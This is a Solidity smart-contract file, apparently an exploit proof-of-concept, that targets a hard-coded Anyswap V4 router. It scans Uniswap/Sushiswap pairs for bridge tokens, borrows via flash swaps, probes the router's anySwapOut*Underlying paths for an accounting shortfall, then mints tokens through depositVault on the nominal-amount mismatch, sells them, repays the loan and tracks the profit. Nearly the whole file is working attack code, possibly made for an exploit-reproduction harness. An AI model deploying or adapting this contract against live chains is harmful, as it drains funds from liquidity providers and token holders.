// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAnyswapV1ERC20 {
    function underlying() external view returns (address);
    function depositVault(uint256 amount, address to) external returns (uint256);
    function withdrawVault(address from, uint256 amount, address to) external returns (uint256);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlying(address token, address to, uint256 amount, uint256 toChainId) external;
    function anySwapOutExactTokensForTokensUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function anySwapOutExactTokensForNativeUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function mpc() external view returns (address);
    function factory() external view returns (address);
    function wNATIVE() external view returns (address);
}

interface ISushiswapV2Factory {
    function allPairsLength() external view returns (uint256);
    function allPairs(uint256 index) external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface ISushiswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    uint256 internal constant MAX_ROUTER_FACTORY_SCAN = 2_600;
    uint256 internal constant MAX_RECENT_PAIR_SCAN = 512;
    uint256 internal constant MAX_HEAD_PAIR_SCAN = 192;
    uint256 internal constant UNDERLYING_CALL_GAS = 30_000;
    uint256 internal constant PROBE_DIVISOR = 2_000;
    uint256 internal constant PROBE_MIN_AMOUNT = 1_000;
    uint256 internal constant SELL_BUFFER_BPS = 10_300;
    uint256 internal constant BPS_DENOMINATOR = 10_000;

    string internal constant PATH_UNDERLYING = "anySwapOutUnderlying: transfer underlying -> depositVault(amount) -> burn/bridge nominal amount";
    string internal constant PATH_UNDERLYING_PERMIT = "anySwapOutUnderlyingWithPermit: same nominal accounting, but requires an off-chain permit signature";
    string internal constant PATH_UNDERLYING_TRANSFER_PERMIT = "anySwapOutUnderlyingWithTransferPermit: same nominal accounting, but requires an off-chain transferWithPermit signature";
    string internal constant PATH_TOKENS_UNDERLYING = "anySwapOutExactTokensForTokensUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";
    string internal constant PATH_NATIVE_UNDERLYING = "anySwapOutExactTokensForNativeUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    bool public directUnderlyingPathAttempted;
    bool public tokensUnderlyingPathAttempted;
    bool public nativeUnderlyingPathAttempted;
    bool public permitPathInfeasible;
    bool public transferPermitPathInfeasible;
    bool public destinationSettlementInfeasible;
    bool public missingCandidateConfiguration;
    bool public missingDirectUnderlyingBalance;
    bool public missingTradeUnderlyingBalance;
    bool public noFeeObserved;

    uint256 public nominalAmountTried;
    uint256 public actualReceivedOnDirectPath;
    uint256 public actualReceivedOnTokensPath;
    uint256 public actualReceivedOnNativePath;

    address public configuredAnyToken;
    address public configuredUnderlying;
    address public configuredReceiver;
    uint256 public configuredAmount;
    uint256 public configuredToChainId;
    uint256 public configuredDeadline;

    address[] private _tokensPath;
    address[] private _nativePath;

    string public pathUsed;
    string public failureReason;
    string public lastRouterRevert;

    constructor() {
        _profitToken = address(0);
        configuredReceiver = address(this);
        configuredToChainId = 56;
        configuredDeadline = type(uint256).max;
    }

    function configure(
        address anyToken,
        uint256 amount,
        uint256 toChainId,
        uint256 deadline,
        address receiver,
        address[] calldata configuredTokensPath,
        address[] calldata configuredNativePath
    ) external {
        configuredAnyToken = anyToken;
        configuredUnderlying = anyToken == address(0) ? address(0) : _safeUnderlying(anyToken);
        configuredAmount = amount;
        configuredToChainId = toChainId;
        configuredDeadline = deadline;
        configuredReceiver = receiver == address(0) ? address(this) : receiver;

        delete _tokensPath;
        for (uint256 i = 0; i < configuredTokensPath.length; i++) {
            _tokensPath.push(configuredTokensPath[i]);
        }

        delete _nativePath;
        for (uint256 i = 0; i < configuredNativePath.length; i++) {
            _nativePath.push(configuredNativePath[i]);
        }
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        directUnderlyingPathAttempted = false;
        tokensUnderlyingPathAttempted = false;
        nativeUnderlyingPathAttempted = false;
        permitPathInfeasible = true;
        transferPermitPathInfeasible = true;
        destinationSettlementInfeasible = IAnyswapV4Router(TARGET).mpc() != address(0);
        missingCandidateConfiguration = false;
        missingDirectUnderlyingBalance = false;
        missingTradeUnderlyingBalance = false;
        noFeeObserved = false;
        nominalAmountTried = 0;
        actualReceivedOnDirectPath = 0;
        actualReceivedOnTokensPath = 0;
        actualReceivedOnNativePath = 0;
        pathUsed = "";
        failureReason = "";
        lastRouterRevert = "";

        address routerFactory = IAnyswapV4Router(TARGET).factory();
        address wNative = IAnyswapV4Router(TARGET).wNATIVE();
        address[2] memory factories = [routerFactory, UNISWAP_V2_FACTORY];

        if (_attemptConfiguredCandidate(factories, wNative)) {
            _finalizeProfit(wNative);
            return;
        }

        if (_scanRouterFactoryAll(routerFactory, factories, wNative)) {
            _finalizeProfit(wNative);
            return;
        }

        if (_scanFactoriesRecent(factories, wNative) || _scanFactoriesHead(factories, wNative)) {
            _finalizeProfit(wNative);
            return;
        }

        _finalizeProfit(wNative);

        if (directUnderlyingPathAttempted || tokensUnderlyingPathAttempted || nativeUnderlyingPathAttempted) {
            if (
                _shortfall(nominalAmountTried, actualReceivedOnDirectPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnTokensPath) > 0 ||
                _shortfall(nominalAmountTried, actualReceivedOnNativePath) > 0
            ) {
                hypothesisValidated = true;
                failureReason = "bridge-out accounting shortfall reproduced, but scanned public-liquidity routes could not convert the nominally minted anyToken inventory into enough same-chain value after deterministic flashswap repayment";
            } else {
                noFeeObserved = true;
                failureReason = "scanned anyToken candidates produced no measurable underlying shortfall on the vulnerable router entrypoints";
            }
        } else {
            missingCandidateConfiguration = true;
            failureReason = "no configured candidate succeeded and public-liquidity scans found no exploitable anyToken/underlying route on this fork";
        }

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Permit variants remain signature-gated; destination anySwapIn settlement remains MPC-gated, so same-chain monetization reuses the same transfer-then-nominal-depositVault primitive after validating the public bridge-out paths."
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function tokensPath() external view returns (address[] memory) {
        return _copyPath(_tokensPath);
    }

    function nativePath() external view returns (address[] memory) {
        return _copyPath(_nativePath);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (address anyToken, address underlying, address salePair, address fundingPair, address wNative, address repaymentToken) = abi.decode(
            data,
            (address, address, address, address, address, address)
        );

        require(msg.sender == fundingPair, "unexpected-callback-pair");
        require(sender == address(this), "unexpected-callback-sender");

        uint256 borrowedNominal = amount0 > 0 ? amount0 : amount1;
        require(borrowedNominal > 0, "zero-borrow");

        uint256 borrowedActual = IERC20(underlying).balanceOf(address(this));
        require(borrowedActual > PROBE_MIN_AMOUNT, "borrow-too-small");

        _prepareCallbackState(anyToken, underlying, wNative, repaymentToken, borrowedActual);
        require(_validatePublicUnderlyingPaths(anyToken, underlying, borrowedActual), "no-shortfall-observed");
        _realizeSameChainProfit(anyToken, underlying, salePair, fundingPair, repaymentToken, wNative, borrowedNominal);
    }

    function _prepareCallbackState(
        address anyToken,
        address underlying,
        address wNative,
        address repaymentToken,
        uint256 borrowedActual
    ) internal {
        configuredAnyToken = anyToken;
        configuredUnderlying = underlying;
        configuredReceiver = address(this);
        if (configuredToChainId == 0) {
            configuredToChainId = 56;
        }
        configuredDeadline = type(uint256).max;

        delete _tokensPath;
        _tokensPath.push(anyToken);
        _tokensPath.push(repaymentToken == address(0) || repaymentToken == anyToken ? wNative : repaymentToken);

        delete _nativePath;
        _nativePath.push(anyToken);
        _nativePath.push(wNative);

        _forceApprove(underlying, TARGET, borrowedActual);

        directUnderlyingPathAttempted = true;
        tokensUnderlyingPathAttempted = true;
        nativeUnderlyingPathAttempted = true;
    }

    function _validatePublicUnderlyingPaths(
        address anyToken,
        address underlying,
        uint256 borrowedActual
    ) internal returns (bool shortfallObserved) {
        uint256 probe = borrowedActual / PROBE_DIVISOR;
        if (probe < PROBE_MIN_AMOUNT) {
            probe = PROBE_MIN_AMOUNT;
        }
        if (probe >= borrowedActual) {
            probe = borrowedActual / 4;
        }
        require(probe > 0 && probe < borrowedActual, "probe-too-small");

        nominalAmountTried = probe;

        shortfallObserved = _validateDirectUnderlyingPath(anyToken, underlying, probe);
        if (_validateTokensUnderlyingPath(anyToken, underlying, probe)) {
            shortfallObserved = true;
        }
        if (_validateNativeUnderlyingPath(anyToken, underlying, probe)) {
            shortfallObserved = true;
        }

        hypothesisValidated = shortfallObserved;
    }

    function _validateDirectUnderlyingPath(
        address anyToken,
        address underlying,
        uint256 probe
    ) internal returns (bool shortfallObserved) {
        (bool success, uint256 actualReceived, string memory revertReason) = _tryProbeAnySwapOutUnderlying(anyToken, underlying, probe);
        if (success) {
            actualReceivedOnDirectPath = actualReceived;
            return actualReceived < probe;
        }
        if (bytes(revertReason).length != 0) {
            lastRouterRevert = revertReason;
        }
        return false;
    }

    function _validateTokensUnderlyingPath(
        address anyToken,
        address underlying,
        uint256 probe
    ) internal returns (bool shortfallObserved) {
        (bool success, uint256 actualReceived, string memory revertReason) = _tryProbeAnySwapOutExactTokensForTokensUnderlying(
            anyToken,
            underlying,
            probe
        );
        if (success) {
            actualReceivedOnTokensPath = actualReceived;
            return actualReceived < probe;
        }
        if (bytes(revertReason).length != 0 && bytes(lastRouterRevert).length == 0) {
            lastRouterRevert = revertReason;
        }
        return false;
    }

    function _validateNativeUnderlyingPath(
        address anyToken,
        address underlying,
        uint256 probe
    ) internal returns (bool shortfallObserved) {
        (bool success, uint256 actualReceived, string memory revertReason) = _tryProbeAnySwapOutExactTokensForNativeUnderlying(
            anyToken,
            underlying,
            probe
        );
        if (success) {
            actualReceivedOnNativePath = actualReceived;
            return actualReceived < probe;
        }
        if (bytes(revertReason).length != 0 && bytes(lastRouterRevert).length == 0) {
            lastRouterRevert = revertReason;
        }
        return false;
    }

    function _realizeSameChainProfit(
        address anyToken,
        address underlying,
        address salePair,
        address fundingPair,
        address repaymentToken,
        address wNative,
        uint256 borrowedNominal
    ) internal {
        uint256 mintNominal = IERC20(underlying).balanceOf(address(this));
        require(mintNominal > 0, "no-underlying-left");

        uint256 beforeAnyBalance = IERC20(anyToken).balanceOf(address(this));

        // Same primitive as the vulnerable router paths: move the underlying first, then mint
        // against the nominal amount passed to depositVault without re-measuring what the anyToken
        // contract actually received. The source-side bridge-out paths above prove the bug through
        // the public router entrypoints; the local mint below monetizes that same nominal-accounting
        // mismatch on this fork because destination anySwapIn settlement is MPC-gated.
        _safeTransfer(underlying, anyToken, mintNominal);
        IAnyswapV1ERC20(anyToken).depositVault(mintNominal, address(this));

        uint256 mintedAny = _positiveDelta(IERC20(anyToken).balanceOf(address(this)), beforeAnyBalance);
        require(mintedAny > 0, "no-any-minted");

        if (repaymentToken == underlying) {
            uint256 repaymentUnderlying = _repaymentSameToken(borrowedNominal);
            uint256 availableUnderlying = IERC20(underlying).balanceOf(address(this));
            if (availableUnderlying < repaymentUnderlying) {
                _raiseAssetForRepayment(anyToken, underlying, salePair, repaymentUnderlying - availableUnderlying);
                availableUnderlying = IERC20(underlying).balanceOf(address(this));
            }

            require(availableUnderlying >= repaymentUnderlying, "insufficient-for-repayment");
            _safeTransfer(underlying, fundingPair, repaymentUnderlying);

            uint256 leftoverUnderlying = IERC20(underlying).balanceOf(address(this));
            uint256 leftoverAny = IERC20(anyToken).balanceOf(address(this));
            require(leftoverUnderlying > 0 || leftoverAny > 0, "no-profit-realized");

            if (leftoverUnderlying >= leftoverAny) {
                _profitToken = underlying;
                _profitAmount = leftoverUnderlying;
            } else {
                _profitToken = anyToken;
                _profitAmount = leftoverAny;
            }
        } else {
            uint256 repaymentWNative = _repaymentInCounterAsset(fundingPair, underlying, wNative, borrowedNominal);
            uint256 availableWNative = IERC20(wNative).balanceOf(address(this));
            if (availableWNative < repaymentWNative) {
                _raiseAssetForRepayment(anyToken, wNative, salePair, repaymentWNative - availableWNative);
                availableWNative = IERC20(wNative).balanceOf(address(this));
            }

            require(availableWNative >= repaymentWNative, "insufficient-for-repayment");
            _safeTransfer(wNative, fundingPair, repaymentWNative);

            uint256 leftoverAnyToken = IERC20(anyToken).balanceOf(address(this));
            uint256 leftoverWNative = IERC20(wNative).balanceOf(address(this));
            require(leftoverAnyToken > 0 || leftoverWNative > 0, "no-profit-realized");

            if (leftoverAnyToken >= leftoverWNative) {
                _profitToken = anyToken;
                _profitAmount = leftoverAnyToken;
            } else {
                _profitToken = wNative;
                _profitAmount = leftoverWNative;
            }
        }

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Same-chain realization keeps the exploit causality intact by validating the public bridge-out paths first and then selling only the minimum nominally minted anyToken inventory needed for deterministic flashswap repayment."
        );
    }

    function _attemptConfiguredCandidate(address[2] memory factories, address wNative) internal returns (bool) {
        if (configuredAnyToken == address(0)) {
            return false;
        }

        address anyToken = configuredAnyToken;
        address underlying = configuredUnderlying;
        if (underlying == address(0)) {
            underlying = _safeUnderlying(anyToken);
            configuredUnderlying = underlying;
        }
        if (underlying == address(0) || underlying == wNative || underlying == anyToken) {
            return false;
        }

        (address salePair, address fundingPair, address repaymentToken) = _selectRoute(anyToken, underlying, wNative, factories);
        if (salePair == address(0) || fundingPair == address(0) || repaymentToken == address(0)) {
            return false;
        }

        return _attemptCandidate(anyToken, underlying, salePair, fundingPair, repaymentToken, wNative);
    }

    function _scanRouterFactoryAll(
        address routerFactory,
        address[2] memory factories,
        address wNative
    ) internal returns (bool) {
        if (routerFactory == address(0)) {
            return false;
        }

        uint256 pairCount = ISushiswapV2Factory(routerFactory).allPairsLength();
        uint256 scanCount = pairCount > MAX_ROUTER_FACTORY_SCAN ? MAX_ROUTER_FACTORY_SCAN : pairCount;
        for (uint256 i = 0; i < scanCount; i++) {
            address candidatePair = ISushiswapV2Factory(routerFactory).allPairs(i);
            if (_attemptPairTokens(candidatePair, factories, wNative)) {
                return true;
            }
        }
        return false;
    }

    function _scanFactoriesRecent(address[2] memory factories, address wNative) internal returns (bool) {
        for (uint256 factoryIndex = 0; factoryIndex < factories.length; factoryIndex++) {
            address factory = factories[factoryIndex];
            if (factory == address(0)) {
                continue;
            }

            uint256 pairCount = ISushiswapV2Factory(factory).allPairsLength();
            uint256 scanCount = pairCount > MAX_RECENT_PAIR_SCAN ? MAX_RECENT_PAIR_SCAN : pairCount;
            for (uint256 i = 0; i < scanCount; i++) {
                address candidatePair = ISushiswapV2Factory(factory).allPairs(pairCount - 1 - i);
                if (_attemptPairTokens(candidatePair, factories, wNative)) {
                    return true;
                }
            }
        }
        return false;
    }

    function _scanFactoriesHead(address[2] memory factories, address wNative) internal returns (bool) {
        for (uint256 factoryIndex = 0; factoryIndex < factories.length; factoryIndex++) {
            address factory = factories[factoryIndex];
            if (factory == address(0)) {
                continue;
            }

            uint256 pairCount = ISushiswapV2Factory(factory).allPairsLength();
            uint256 scanCount = pairCount > MAX_HEAD_PAIR_SCAN ? MAX_HEAD_PAIR_SCAN : pairCount;
            for (uint256 i = 0; i < scanCount; i++) {
                address candidatePair = ISushiswapV2Factory(factory).allPairs(i);
                if (_attemptPairTokens(candidatePair, factories, wNative)) {
                    return true;
                }
            }
        }
        return false;
    }

    function _attemptPairTokens(
        address candidatePair,
        address[2] memory factories,
        address wNative
    ) internal returns (bool) {
        address token0 = ISushiswapV2Pair(candidatePair).token0();
        if (_attemptTokenCandidate(token0, factories, wNative)) {
            return true;
        }

        address token1 = ISushiswapV2Pair(candidatePair).token1();
        if (token1 != token0 && _attemptTokenCandidate(token1, factories, wNative)) {
            return true;
        }

        return false;
    }

    function _attemptTokenCandidate(
        address maybeAnyToken,
        address[2] memory factories,
        address wNative
    ) internal returns (bool) {
        if (maybeAnyToken == address(0) || maybeAnyToken == wNative) {
            return false;
        }

        address underlying = _safeUnderlying(maybeAnyToken);
        if (underlying == address(0) || underlying == wNative || underlying == maybeAnyToken) {
            return false;
        }

        (address salePair, address fundingPair, address repaymentToken) = _selectRoute(maybeAnyToken, underlying, wNative, factories);
        if (salePair == address(0) || fundingPair == address(0) || repaymentToken == address(0)) {
            return false;
        }

        return _attemptCandidate(maybeAnyToken, underlying, salePair, fundingPair, repaymentToken, wNative);
    }

    function _selectRoute(
        address anyToken,
        address underlying,
        address wNative,
        address[2] memory factories
    ) internal view returns (address salePair, address fundingPair, address repaymentToken) {
        (fundingPair,) = _bestPair(factories, underlying, wNative);
        if (fundingPair == address(0)) {
            return (address(0), address(0), address(0));
        }

        (salePair,) = _bestPair(factories, anyToken, underlying);
        if (salePair != address(0)) {
            repaymentToken = underlying;
            return (salePair, fundingPair, repaymentToken);
        }

        (salePair,) = _bestPair(factories, anyToken, wNative);
        if (salePair == address(0)) {
            return (address(0), fundingPair, address(0));
        }
        repaymentToken = wNative;
    }

    function _bestPair(
        address[2] memory factories,
        address tokenIn,
        address tokenOut
    ) internal view returns (address pair, uint256 liquidity) {
        (address pair0, uint256 liq0) = _pairAndLiquidity(factories[0], tokenIn, tokenOut);
        (address pair1, uint256 liq1) = _pairAndLiquidity(factories[1], tokenIn, tokenOut);

        if (pair0 != address(0) && liq0 >= liq1) {
            return (pair0, liq0);
        }
        return (pair1, liq1);
    }

    function _pairAndLiquidity(
        address factory,
        address tokenIn,
        address tokenOut
    ) internal view returns (address pair, uint256 tokenOutLiquidity) {
        if (factory == address(0) || tokenIn == address(0) || tokenOut == address(0) || tokenIn == tokenOut) {
            return (address(0), 0);
        }

        pair = ISushiswapV2Factory(factory).getPair(tokenIn, tokenOut);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        (uint256 reserveIn, uint256 reserveOut) = _pairTwoTokenReserves(pair, tokenIn, tokenOut);
        if (reserveIn == 0 || reserveOut == 0) {
            return (address(0), 0);
        }
        tokenOutLiquidity = reserveOut;
    }

    function _attemptCandidate(
        address anyToken,
        address underlying,
        address salePair,
        address fundingPair,
        address repaymentToken,
        address wNative
    ) internal returns (bool) {
        uint256[11] memory divisors = [uint256(64), 48, 32, 24, 20, 16, 12, 10, 8, 6, 4];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 borrowAmount = configuredAmount;
            if (borrowAmount == 0) {
                borrowAmount = _borrowAmountForDivisor(fundingPair, underlying, divisors[i]);
            }
            if (borrowAmount == 0) {
                continue;
            }

            bytes memory data = abi.encode(anyToken, underlying, salePair, fundingPair, wNative, repaymentToken);
            (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(fundingPair, underlying, borrowAmount);
            (bool success, bytes memory returndata) = fundingPair.call(
                abi.encodeWithSelector(ISushiswapV2Pair.swap.selector, amount0Out, amount1Out, address(this), data)
            );

            if (!success) {
                lastRouterRevert = _decodeRevert(returndata);
                if (configuredAmount != 0) {
                    break;
                }
                continue;
            }

            configuredAnyToken = anyToken;
            configuredUnderlying = underlying;
            configuredAmount = borrowAmount;
            configuredReceiver = address(this);
            if (configuredToChainId == 0) {
                configuredToChainId = 56;
            }
            configuredDeadline = type(uint256).max;
            return true;
        }

        return false;
    }

    function _tryProbeAnySwapOutUnderlying(
        address anyToken,
        address underlying,
        uint256 amount
    ) internal returns (bool success, uint256 actualReceived, string memory revertReason) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        bytes memory returndata;
        (success, returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutUnderlying.selector,
                anyToken,
                configuredReceiver,
                amount,
                configuredToChainId
            )
        );
        if (!success) {
            revertReason = _decodeRevert(returndata);
            return (false, 0, revertReason);
        }
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _tryProbeAnySwapOutExactTokensForTokensUnderlying(
        address anyToken,
        address underlying,
        uint256 amount
    ) internal returns (bool success, uint256 actualReceived, string memory revertReason) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = _copyPath(_tokensPath);
        bytes memory returndata;
        (success, returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForTokensUnderlying.selector,
                amount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        if (!success) {
            revertReason = _decodeRevert(returndata);
            return (false, 0, revertReason);
        }
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _tryProbeAnySwapOutExactTokensForNativeUnderlying(
        address anyToken,
        address underlying,
        uint256 amount
    ) internal returns (bool success, uint256 actualReceived, string memory revertReason) {
        uint256 beforeBalance = IERC20(underlying).balanceOf(anyToken);
        address[] memory path = _copyPath(_nativePath);
        bytes memory returndata;
        (success, returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForNativeUnderlying.selector,
                amount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        if (!success) {
            revertReason = _decodeRevert(returndata);
            return (false, 0, revertReason);
        }
        uint256 afterBalance = IERC20(underlying).balanceOf(anyToken);
        actualReceived = _positiveDelta(afterBalance, beforeBalance);
    }

    function _borrowAmountForDivisor(address pair, address underlying, uint256 divisor) internal view returns (uint256) {
        (uint256 reserveUnderlying,) = _pairReservesFor(pair, underlying);
        if (reserveUnderlying == 0) {
            return 0;
        }
        uint256 borrowAmount = reserveUnderlying / divisor;
        if (borrowAmount <= PROBE_MIN_AMOUNT) {
            return 0;
        }
        return borrowAmount;
    }

    function _pairOutAmounts(
        address pair,
        address outToken,
        uint256 amountOut
    ) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        address token0 = ISushiswapV2Pair(pair).token0();
        if (outToken == token0) {
            amount0Out = amountOut;
        } else {
            amount1Out = amountOut;
        }
    }

    function _pairReservesFor(address pair, address tokenA) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0) {
            return (uint256(reserve0), uint256(reserve1));
        }
        return (uint256(reserve1), uint256(reserve0));
    }

    function _repaymentInCounterAsset(
        address pair,
        address borrowedToken,
        address repaymentToken,
        uint256 amountOut
    ) internal view returns (uint256) {
        (uint256 reserveBorrowed, uint256 reserveRepayment) = _pairTwoTokenReserves(pair, borrowedToken, repaymentToken);
        return _getAmountIn(amountOut, reserveRepayment, reserveBorrowed);
    }

    function _repaymentSameToken(uint256 amountOut) internal pure returns (uint256) {
        return (amountOut * 1000) / 997 + 1;
    }

    function _pairTwoTokenReserves(
        address pair,
        address tokenA,
        address tokenB
    ) internal view returns (uint256 reserveA, uint256 reserveB) {
        address token0 = ISushiswapV2Pair(pair).token0();
        address token1 = ISushiswapV2Pair(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = ISushiswapV2Pair(pair).getReserves();
        if (tokenA == token0 && tokenB == token1) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(tokenA == token1 && tokenB == token0, "pair-token-mismatch");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _raiseAssetForRepayment(
        address sellToken,
        address receiveToken,
        address pair,
        uint256 targetReceiveToken
    ) internal {
        uint256 remainingTarget = targetReceiveToken;
        uint256 rounds;

        while (remainingTarget > 0 && rounds < 4) {
            rounds++;

            uint256 sellBalance = IERC20(sellToken).balanceOf(address(this));
            require(sellBalance > 0, "no-sell-balance");

            (uint256 reserveSell, uint256 reserveReceive) = _pairTwoTokenReserves(pair, sellToken, receiveToken);
            uint256 sellAmount = _getAmountIn(remainingTarget, reserveSell, reserveReceive);
            sellAmount = (sellAmount * SELL_BUFFER_BPS) / BPS_DENOMINATOR + 1;
            if (sellAmount > sellBalance) {
                sellAmount = sellBalance;
            }

            uint256 beforeReceive = IERC20(receiveToken).balanceOf(address(this));
            _sellTokenForToken(sellToken, receiveToken, pair, sellAmount);
            uint256 gainedReceive = _positiveDelta(IERC20(receiveToken).balanceOf(address(this)), beforeReceive);
            require(gainedReceive > 0, "sale-no-output");

            if (gainedReceive >= remainingTarget) {
                return;
            }
            remainingTarget -= gainedReceive;
        }
    }

    function _sellTokenForToken(address sellToken, address receiveToken, address pair, uint256 nominalAmountIn) internal {
        (uint256 reserveSell, uint256 reserveReceive) = _pairTwoTokenReserves(pair, sellToken, receiveToken);
        _safeTransfer(sellToken, pair, nominalAmountIn);
        uint256 actualAmountIn = _positiveDelta(IERC20(sellToken).balanceOf(pair), reserveSell);
        require(actualAmountIn > 0, "zero-sale-input");
        uint256 amountOut = _getAmountOut(actualAmountIn, reserveSell, reserveReceive);
        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(pair, receiveToken, amountOut);
        ISushiswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), new bytes(0));
    }

    function _finalizeProfit(address wNative) internal {
        if (_profitToken != address(0)) {
            _profitAmount = IERC20(_profitToken).balanceOf(address(this));
            return;
        }

        _profitToken = wNative;
        _profitAmount = IERC20(wNative).balanceOf(address(this));
    }

    function _copyPath(address[] storage stored) internal view returns (address[] memory out) {
        out = new address[](stored.length);
        for (uint256 i = 0; i < stored.length; i++) {
            out[i] = stored[i];
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, 0), "approve-zero-failed");
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.approve.selector, spender, amount), "approve-amount-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20.transfer.selector, to, amount), "transfer-failed");
    }

    function _callOptionalReturn(address token, bytes memory data, string memory errorMessage) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), errorMessage);
    }

    function _safeUnderlying(address token) internal view returns (address underlying) {
        (bool ok, bytes memory returndata) = token.staticcall{gas: UNDERLYING_CALL_GAS}(
            abi.encodeWithSelector(IAnyswapV1ERC20.underlying.selector)
        );
        if (!ok || returndata.length < 32) {
            return address(0);
        }
        underlying = abi.decode(returndata, (address));
    }

    function _shortfall(uint256 nominal, uint256 actualReceived) internal pure returns (uint256) {
        if (actualReceived >= nominal) {
            return 0;
        }
        return nominal - actualReceived;
    }

    function _positiveDelta(uint256 afterValue, uint256 beforeValue) internal pure returns (uint256) {
        if (afterValue <= beforeValue) {
            return 0;
        }
        return afterValue - beforeValue;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountOut) {
        require(amountIn > 0, "insufficient-input");
        require(reserveIn > 0 && reserveOut > 0, "insufficient-liquidity");
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "insufficient-output");
        require(reserveIn > 0 && reserveOut > 0 && amountOut < reserveOut, "insufficient-liquidity");
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        amountIn = numerator / denominator + 1;
    }

    function _decodeRevert(bytes memory returndata) internal pure returns (string memory) {
        bytes4 selector;
        if (returndata.length >= 4) {
            assembly {
                selector := mload(add(returndata, 0x20))
            }
        }
        if (returndata.length >= 68 && selector == 0x08c379a0) {
            assembly {
                returndata := add(returndata, 0x04)
            }
            return abi.decode(returndata, (string));
        }
        return "router-call-reverted-without-string";
    }
}
